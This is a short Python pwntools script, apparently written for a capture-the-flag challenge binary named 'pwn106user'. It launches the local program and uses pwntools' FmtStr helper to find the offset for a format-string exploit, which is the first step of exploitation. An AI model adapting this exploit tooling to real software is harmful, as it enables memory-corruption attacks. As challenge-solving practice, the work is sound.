from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

context.clear(arch = 'amd64')
def send_payload(payload):
        s.sendlineafter(b': ',payload)
        r = s.recvline()
        s.recvline()
        return r

s = process('./pwn106user.pwn106-user')
print(FmtStr(execute_fmt=send_payload).offset)
